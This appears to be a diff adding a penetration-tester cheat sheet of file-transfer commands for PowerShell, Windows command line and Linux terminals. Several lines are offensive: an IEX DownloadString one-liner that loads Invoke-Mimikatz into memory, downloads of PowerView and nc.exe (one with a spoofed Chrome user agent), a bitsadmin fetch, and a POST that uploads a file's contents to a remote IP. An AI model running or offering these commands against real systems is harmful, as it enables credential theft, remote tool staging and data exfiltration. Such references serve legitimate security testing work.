@@ -1,0 +1,38 @@
+Use PowerShell Command
+
+Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
+	#Download a file
+
+IEX (New-Object Net.WebClient).DownloadString('http://<snip>/Invoke-Mimikatz.ps1')
+	#Executr a file in memory
+
+Invoke-WebRequest -Uri http://10.10.10.10:443 -Method POST -Body $b64 -InFile "Path\To\File.txt" -ContentType "text/plain"
+	#Upload a file 
+
+Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -Outfile "nc.exe"
+	#using a Chrome User Agent
+-------------------------------------------------------------------------------------------------------------------
+Use Command Line tool in windows.
+
+bitsadmin /transfer n http://10.10.10.10/nc.exe C:\Temo\nc.exe
+	#Download a file
+
+-------------------------------------------------------------------------------------------------------------------
+Use terminal tool
+
+wget <url>/path/to/file.txt -O path/for/download/file.txt
+	#Download a file
+
+curl -o path/for/download/file.txt <url>/path/to/file.txt
+	#Download a file
+
+php -r '$file = file_get_contents("<url>/path/to/file.txt"); file_put_contents("path/to/download/file.txt",$file);'
+	#Download a file
+
+scp path/to/file.txt account@target_ip:/path/for/download/file.txt
+	#SSH upload a file
+
+scp account@target_ip:/path/to/file.txt path/for/download/file.txt
+	#SSH download a file
+
+
